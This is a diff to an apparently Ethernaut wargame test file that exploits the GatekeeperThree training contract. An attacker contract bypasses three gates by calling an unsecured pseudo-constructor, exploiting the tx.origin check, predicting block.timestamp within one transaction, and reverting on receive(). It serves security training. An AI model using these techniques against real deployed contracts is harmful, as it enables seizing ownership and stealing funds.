@@ -11,22 +11,13 @@ def test_lv28():
     ethernaut.check_lv28(contract)
 
 def exploit_lv28(contract: GatekeeperThree):
-    # first deploy an attacker contract
-    # we need a separate contract so that msg.sender != tx.origin 
-    # is not the same (see gate 1)
+    # Attack vector - gate 1: tx.origin is not changed in redirect => helper contract can be used + unsecured construction method construct0r()
+    # Attack vector - gate 2: calling createTrick() and getAllowance() in the same tx => value of block.timestamp is the same
+    # Attack vector - gate 3: sending some ether to the contract and revert on receive()
+    # Training: know what attacker can have under his controll
+
     attacker = GatekeeperThreeAttacker.deploy(contract)
-
-    # to bypass gate 1, attacker calls the construct0r() function,
-    # which is disguised as a constructor, however anyone can 
-    # call it and become the owner
     attacker.bypassGate1()
-
-    # to bypass gate 2, we call createTrick() and getAllowance()
-    # in the same tx, that way we know exactly the value of block.timestamp
     attacker.bypassGate2()
-
-    # to bypass gate 3, we must send some ether to the contract 
-    # and revert on receive()
     attacker.bypassGate3(value=10**18)
-
     attacker.enter()
